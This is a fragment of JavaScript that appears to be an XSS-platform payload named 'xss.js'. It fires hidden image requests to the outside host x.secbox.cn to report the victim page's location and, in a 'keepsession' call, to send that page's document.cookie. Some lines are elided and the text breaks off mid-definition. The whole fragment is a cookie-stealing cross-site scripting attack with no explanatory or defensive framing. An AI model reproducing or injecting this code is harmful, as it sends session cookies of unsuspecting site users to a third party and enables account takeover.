(function() {
	(new Image()).src = 'http://x.secbox.cn/index.php?do=api&id=ioeOsK&location=' + escape((function() {
			try {
...
if('' == 1) {
	keep = new Image();
	keep.src = 'http://x.secbox.cn/index.php?do=keepsession&id=ioeOsK&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};;;
var xss = function() {
	var x = {
		'name': 'xss.js',
